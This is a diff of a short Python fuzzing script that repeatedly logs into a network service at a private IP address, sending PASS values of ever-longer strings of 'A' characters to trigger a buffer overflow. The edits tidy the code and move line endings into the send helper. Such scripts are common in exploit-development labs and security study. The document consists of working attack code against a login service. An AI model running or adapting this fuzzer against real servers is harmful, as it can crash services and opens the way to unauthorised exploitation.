@@ -1,7 +1,6 @@
 #! /usr/bin/env python3
 
 import socket
-import time
 
 # Destination information #
 DEST_IP = '10.192.0.235'
@@ -17,11 +16,11 @@ BUF_LENGTH = 10
 
 
 for x in range(1,BUF_LENGTH):
-	counter = counter+STEP
+	counter = counter+STEP #Extending the string in the buffer 
 	pw_buf.append("\x41"*counter)
 
 def send_data(socket, text):
-	socket.send(text.encode())
+	socket.send((text+'\r\n').encode())
 
 for pw in pw_buf:
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -29,9 +28,9 @@ for pw in pw_buf:
 	s.connect((DEST_IP, DEST_PORT))
 	print (s.recv(1024))
 
-	send_data(s, 'USER test' + '\r\n')
-	send_data(s, 'PASS ' + pw + '\r\n')
-	send_data(s, 'QUIT' + '\r\n')
+	send_data(s, 'USER test')
+	send_data(s, 'PASS ' + pw)
+	send_data(s, 'QUIT')
 
 	s.close()
 	print("All done\n")
